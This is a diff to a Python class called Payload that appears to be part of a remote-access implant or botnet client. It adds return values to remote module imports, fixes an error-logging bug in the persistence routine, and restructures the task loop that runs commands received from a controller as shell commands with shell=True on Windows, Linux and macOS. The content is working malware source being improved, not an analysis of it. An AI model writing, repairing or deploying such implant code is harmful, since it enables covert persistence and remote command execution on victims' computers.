@@ -408,8 +408,10 @@ class Payload():
                 try:
                     exec('import {}'.format(module), target)
                     log('[+] {} remotely imported'.format(module))
+                    return '[+] {} remotely imported'.format(module)
                 except Exception as e:
                     log("{} error: {}".format(self.load.func_name, str(e)))
+                    return "{} error: {}".format(self.load.func_name, str(e))
 
     @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
     def stop(self, target):
@@ -945,7 +947,7 @@ class Payload():
                     try:
                         getattr(globals()['persistence']._methods[method], cmd)()
                     except Exception as e:
-                        log("{} error: {}".format(self.persistence.func_name), str(e))
+                        log("{} error: {}".format(self.persistence.func_name, str(e)))
             return json.dumps(globals()['persistence'].results())
         except Exception as e:
             log("{} error: {}".format(self.persistence.func_name, str(e)))
@@ -1078,7 +1080,10 @@ class Payload():
                         cmd, _, action = task['task'].encode().partition(' ')
                         try:
                             command = self._get_command(cmd)
-                            result = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                            if command:
+                                result = bytes(command(action) if action else command())
+                            else:
+                                result = bytes().join(subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                         except Exception as e:
                             result = "{} error: {}".format(self.run.func_name, str(e))
                             log(result)
